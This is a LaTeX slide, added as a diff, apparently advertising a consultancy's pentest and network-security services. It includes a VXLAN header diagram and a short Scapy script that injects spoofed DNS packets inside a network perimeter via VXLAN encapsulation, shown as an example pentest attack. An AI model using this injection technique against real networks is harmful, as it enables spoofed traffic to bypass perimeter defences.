@@ -1,0 +1,102 @@
+\documentclass[12pt]{foils}
+%\documentclass[16pt,landscape,a4paper,footrule]{foils}
+\usepackage{zencurity-slides}
+
+% This is an example presentation
+
+\setlength\paperheight{300mm}%
+\setlength\paperwidth{360mm}
+
+% vertikalt
+\setlength{\voffset}{0mm}
+\setlength{\topmargin}{-2.54cm}
+\setlength{\headheight}{5mm}
+\setlength{\textheight}{270mm}
+
+% horisontalt
+%\setlength{\hoffset}{-2.54cm} % så logo går helt ud!
+\setlength{\hoffset}{0mm}
+\setlength{\oddsidemargin}{-15.4mm}
+\setlength{\textwidth}{340mm}
+\setlength{\columnwidth}{250mm}
+\setlength{\parindent}{0mm}
+
+\MyLogo{\color{titlecolor}Henrik Kramselund Jereminsen +45 2026 6000 hkj@zencurity.com @kramse \faTwitter \hskip 5mm \faGithub}
+
+\begin{document}
+
+%\rm
+\selectlanguage{english}
+
+\LogoOn
+
+
+\slide{Zencurity: infrastructure security and testing}
+
+\begin{list2}
+\item  Pentest and security services focused on network infrastructure and reviewing
+%\\ Review a 60 routers network or 5.000 line firewall config -- no problem
+%\item Need help creating a LIR in RIPE NCC or procure IP addresses
+%\\ We ensure efficient handling of the process for customer
+\item Getting your network online, from procurement of connections and devices to full BGP configuration
+%\\ This is a basic service we have done multiple times
+\item We provide performance, penetration testing and DDoS testing -- port scans are free
+% \\Port scans are free, paid services result in PDF report suitable for management and customers
+\item Network security consulting, network design, routers, loadbalancing, ask
+\item Need an Intrusion Detection System (IDS) -- we recommend and run Suricata IDS and Zeek in production
+%\\ Projects where we have recommended and configured Suricata IDS, Bro/Zeek in production setup multiple times
+\end{list2}
+
+\begin{figure}[!htb]
+\centering
+\begin{minipage}[t]{0.45\textwidth}
+\fbox{\bf\footnotesize Example pentest attacks, VXLAN packet injection}
+\vskip 12mm
+\begin{alltt}\scriptsize
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|R|R|R|R|I|R|R|R|            Reserved                           |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                VXLAN Network Identifier (VNI) |   Reserved    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+Inner Ethernet Header:
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|             Inner Destination MAC Address                     |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+| Inner Destination MAC Address | Inner Source MAC Address      |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                Inner Source MAC Address                       |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|OptnlEthtype = C-Tag 802.1Q    | Inner.VLAN Tag Information    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+\end{alltt}
+\caption{VXLAN Header }
+\end{minipage}%
+\begin{minipage}[t]{0.45\textwidth}
+\fbox{\bf\footnotesize Create VXLAN header and inside packet}
+\vskip 5mm
+\begin{minted}[fontsize=\scriptsize]{python}
+#!/usr/bin/python
+from scapy.all import *
+vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
+vni=37             # Usually VNI == destination VLAN
+vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
+    UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,
+    flags="Instance")
+broadcastmac="ff:ff:ff:ff:ff:ff"
+randommac="00:51:52:01:02:03"
+attacker="185.129.62.666"
+destination="your network"
+packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
+          dst=destination)/UDP(sport=testport,dport=insideport)/
+          DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.zencurity.com"))
+
+srp(packet)
+\end{minted}
+\vskip -4mm\caption{ Spoofed DNS packets inside the perimeter}
+\end{minipage}
+\end{figure}
+
+\vskip 13mm
+\centerline{\Large $\heartsuit$ love internet packets $\heartsuit$}
+
+\end{document}
